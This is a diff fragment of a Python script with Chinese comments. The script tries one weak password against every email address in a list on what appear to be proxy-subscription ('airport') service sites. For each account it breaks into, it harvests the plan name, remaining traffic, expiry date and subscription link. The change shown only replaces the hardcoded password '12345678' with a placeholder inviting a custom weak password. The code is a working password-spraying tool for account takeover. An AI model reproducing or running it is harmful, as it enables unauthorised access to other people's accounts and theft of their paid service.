@@ -20,7 +20,7 @@ result = []
 emails = open('机场users.txt')
 for i in emails:
     post_data = {'email': i,
-                 'password': '12345678',
+                 'password': '自定义一个弱口令',
                  }
     try:
         s = requests.Session() # 适用于<1.7.1版本
@@ -48,7 +48,7 @@ for i in emails:
 
                 sub_plan = resp1.json()["data"]["plan"]["name"]
                 sub_plan1 = sub_plan.encode('unicode_escape').decode('unicode_escape')
-                result_temp = '账号：' + i + '密码：' + '12345678' + '\n' + '套餐名称：' + sub_plan1 + '\n' + '剩余流量：' + traffic_balance + 'GB' + '\n' + '到期时间：' + expired_at + '\n' + '订阅链接：' + sub_link + '\n\n'
+                result_temp = '账号：' + i + '密码：' + '【自定义的弱口令】' + '\n' + '套餐名称：' + sub_plan1 + '\n' + '剩余流量：' + traffic_balance + 'GB' + '\n' + '到期时间：' + expired_at + '\n' + '订阅链接：' + sub_link + '\n\n'  # 修改【自定义的弱口令】
                 print(result_temp)
                 result.append(result_temp)
                 time.sleep(1)
